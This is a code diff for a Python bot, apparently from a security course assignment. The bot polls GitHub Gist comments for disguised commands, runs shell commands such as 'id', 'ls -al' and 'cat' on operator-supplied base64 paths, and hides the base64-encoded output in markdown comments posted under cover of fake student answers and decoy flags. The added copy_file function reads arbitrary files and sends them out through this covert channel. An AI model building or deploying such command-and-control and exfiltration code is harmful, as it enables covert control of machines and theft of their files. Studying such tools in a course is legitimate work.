@@ -7,6 +7,7 @@ from datetime import datetime
 import subprocess
 import base64
 import random
+import string
 
 
 class Git:
@@ -78,6 +79,12 @@ def execute_command(command):
     return process.communicate()
 
 
+def generate_random_string(length):
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    return result_str
+
+
 def get_users(git, message):
     comment_message = "> " + message[0]
     comment_message += "\n\nStudent with id " + ip + " answered: \n\n"
@@ -94,7 +101,7 @@ def get_users(git, message):
 def get_content_of_directory(git, message):
     comment_message = "> " + message[0]
     comment_message += "\n\nStudent with id " + ip + " answered: \nI found one file flag.txt\n\n"
-    bash_command = "ls -al " + str(message[3].split()[3])
+    bash_command = "ls -al " + str(base64.b64decode(message[3].split()[3]).decode("utf-8"))
     output, error = execute_command(bash_command)
     comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"
 
@@ -105,6 +112,18 @@ def get_username(git, message):
     comment_message = "> " + message[0]
     comment_message += "\n\nStudent with id " + ip + " answered: \n" + str(int(random.random() * 100)) + "\n\n"
     bash_command = "id"
+    output, error = execute_command(bash_command)
+    comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"
+
+    git.add_comment_to_gist(comment_message)
+
+
+def copy_file(git, message):
+    comment_message = "> " + message[0]
+    comment_message += "\n\nStudent with id " + ip + " answered: \nThe flag is BSY{"
+    comment_message += generate_random_string(16)
+    comment_message += "}\n\n"
+    bash_command = "cat " + str(base64.b64decode(message[3].split()[3]).decode("utf-8"))
     output, error = execute_command(bash_command)
     comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"
 
@@ -145,4 +164,6 @@ if __name__ == '__main__':
                 get_content_of_directory(git_instance, body)
             elif body[1].startswith("Students, what is the answer"):
                 get_username(git_instance, body)
+            elif body[1].startswith("Students, find and write here"):
+                copy_file(git_instance, body)
         time.sleep(5)
